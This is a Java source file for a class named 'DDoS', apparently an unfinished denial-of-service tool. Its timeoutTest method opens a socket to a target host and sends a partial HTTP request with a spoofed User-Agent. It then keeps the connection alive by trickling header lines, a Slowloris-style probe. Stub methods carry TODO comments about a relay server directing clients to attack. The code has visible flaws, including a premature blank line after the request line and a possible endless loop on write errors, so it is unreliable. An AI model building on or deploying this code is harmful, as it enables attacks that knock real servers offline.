import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class DDoS
{
    private String addr;
    private int port;
    
    final int MAX_TIMES = 30;

    public DDoS(String addr)
    {
        this(addr, 80);
    }
    
    public DDoS(String addr, int port)
    {
        this.addr = addr;
        this.port = port;
    }

    public void initiateAttack()
    {
        int timeout = timeoutTest();
        if (timeout < 0) return;
        
        // TODO tell the relay server to do things
        //     clients will need address, port, and timeout
    }

    public void endAttack()
    {
        // TODO call off the attack
    }

    private int timeoutTest() 
    {
        int timeout = 1;
        try
        {
            Socket s = new Socket(addr, port);
            PrintWriter pw = new PrintWriter(s.getOutputStream());
            
            pw.println("GET / HTTP/1.1\r\n");
            pw.println("Host: " + addr);
            pw.println("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)");
            pw.println("Content-Length: 42");
            pw.flush();
            
            while (timeout < MAX_TIMES)
            {
                try
                {
                    pw.println("X-a: b");
                    if (pw.checkError()) // FIXME I'm not sure if this works the way I think it does...
                        continue;
                    Thread.sleep(timeout * 1000);
                    ++timeout;
                }
                catch (InterruptedException e)
                {
                    System.out.println("Failure while sleeping; retrying...");
                }
            }
            
            s.close();
        }
        catch (UnknownHostException e)
        {
            System.out.println("Unable to find the specified host");
            return -1;
        }
        catch (IOException e)
        {
            System.out.println("An IOException occurred while connecting with the specified host");
            return -1;
        }
        return timeout;
    }

}